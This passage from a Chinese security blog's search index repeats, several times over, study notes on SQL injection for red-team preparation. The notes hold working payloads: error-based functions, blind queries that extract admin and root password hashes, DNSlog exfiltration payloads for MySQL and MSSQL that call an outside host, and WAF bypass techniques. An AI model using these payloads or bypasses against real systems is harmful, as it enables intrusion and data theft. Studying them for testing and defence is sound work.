/*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#11sql写入shell的两个函数"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#12sqlmap的--os-shell原理"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#13sql写入shell的条件"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#14找绝对路径的方法"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#15sqlmap中risk和levels区别"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select 